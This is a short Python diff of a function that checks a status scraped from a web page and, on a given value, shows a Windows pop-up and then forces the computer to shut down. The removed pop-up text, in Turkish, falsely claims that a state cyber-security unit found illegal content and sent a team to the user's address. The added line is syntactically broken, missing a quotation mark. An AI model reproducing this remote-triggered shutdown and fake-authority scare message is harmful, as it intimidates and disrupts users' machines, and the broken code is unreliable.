@@ -19,7 +19,7 @@ def check_status():
         status = status_element.get_text().strip()
 
         if status == "Status: 1":
-            ctypes.windll.user32.MessageBoxW(0, "Bilgisayarda Yasadışı İçerik SİBERAY tarafından bulunmuştur. Adresinize ekip gönderilmiştir.", "T.C Siber Güvenlik", 100)
+            ctypes.windll.user32.MessageBoxW(0, "Bilgisayar kapatılıyor.", Uyarı", 100)
             time.sleep(5)
             os.system("shutdown /s /t 1")
         elif status == "Status: 0":
